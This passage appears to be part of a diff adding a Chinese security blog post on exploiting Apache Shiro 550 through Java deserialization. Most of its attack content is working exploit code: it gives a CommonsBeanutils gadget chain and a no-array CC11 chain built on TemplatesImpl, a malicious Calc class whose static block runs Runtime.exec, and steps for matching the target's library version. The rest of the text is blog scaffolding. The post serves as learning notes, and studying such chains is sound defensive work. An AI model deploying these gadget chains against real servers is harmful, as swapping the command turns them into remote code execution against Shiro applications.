class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;src/main/java/Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        setField(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        setField(beanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,beanComparator);<br>        setField(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setField(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br><br>        serialize(priorityQueue);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>加载的恶意类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里有个注意点，直接用之前的服务端会出现报错</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210140852989.png" srcset="/img/loading.gif" lazyload alt="image-20260210140852989"></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Caused <span class="hljs-keyword">by</span>: java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; <span class="hljs-keyword">local</span> <span class="hljs-built_in">class</span> incompatible: stream classdesc serialVersionUID = <span class="hljs-number">-2044202215314119608</span>, <span class="hljs-keyword">local</span> <span class="hljs-built_in">class</span> serialVersionUID = <span class="hljs-number">-3490850999041592962</span><br></code></pre></td></tr></table></figure>
+
+<p>这是因为shiro中自带的是 CommonsBeanutils 的版本是 1.8.3</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210141154499.png" srcset="/img/loading.gif" lazyload alt="image-20260210141154499"></p>
+<p>而之前的是1.9.2</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210141127764.png" srcset="/img/loading.gif" lazyload alt="image-20260210141127764"></p>
+<blockquote>
+<p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患</p>
+</blockquote>
+<p>所以要改一下EXP环境的依赖，换成1.8.3的</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210141611787.png" srcset="/img/loading.gif" lazyload alt="image-20260210141611787"></p>
+<p>然后就是和前面的一样的操作，最终可以弹出计算器</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210141531421.png" srcset="/img/loading.gif" lazyload alt="image-20260210141531421"></p>
+<h2 id="CC11链（CC2-CC6）"><a href="#CC11链（CC2-CC6）" class="headerlink" title="CC11链（CC2+CC6）"></a>CC11链（CC2+CC6）</h2><p>CC11链笔记：<a href="https://yschen20.github.io/2026/02/10/CC11%E9%93%BE/">https://yschen20.github.io/2026/02/10/CC11%E9%93%BE/</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC11</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;CC11&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;src/main/java/Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        setField(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">/// ========================================带数组的CC11链========================================</span><br><span class="hljs-comment">//        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="hljs-comment">//                new ConstantTransformer(templates),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;newTransformer&quot;,null,null)</span><br><span class="hljs-comment">//        &#125;;</span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="hljs-comment">//        Map map = new HashMap();</span><br><span class="hljs-comment">//        LazyMap decorator = (LazyMap) LazyMap.decorate(map,chainedTransformer);</span><br><span class="hljs-comment">//        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorator,&quot;key&quot;);</span><br><span class="hljs-comment">/// ========================================带数组的CC11链========================================</span><br><br><span class="hljs-comment">/// ========================================不带数组的CC11链========================================</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">decorator</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(map,invokerTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorator,templates);<br><span class="hljs-comment">/// ========================================不带数组的CC11链========================================</span><br><br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setField(tiedMapEntry,<span class="hljs-string">&quot;map&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;123&quot;</span>);<br>        setField(tiedMapEntry,<span class="hljs-string">&quot;map&quot;</span>,decorator);<br><br>        serialize(hashMap);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        java.io.<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileOutputStream(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        java.io.<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ObjectOutputStream(fos);<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        java.io.<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(filename);<br>        java.io.<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ObjectInputStream(fis);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>注意点就是不能带数组，否则打不通，所以要用不带数组的CC11链来打</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210162347154.png" srcset="/img/loading.gif" lazyload alt="image-20260210162347154"></p>
+<p>成功弹计算器</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60210162809067.png" srcset="/img/loading.gif" lazyload alt="image-20260210162809067"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/Java%E5%AE%89%E5%85%A8/Shiro/" class="category-chain-item">Shiro</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Shiro550</div>
+      <div>https://yschen20.github.io/2026/02/10/Shiro550/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Suzen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月10日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年2月10日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/10/CC11%E9%93%BE/" title="CC11链">
+                        <span class="hidden-mobile">CC11链</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("04/25/2025 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
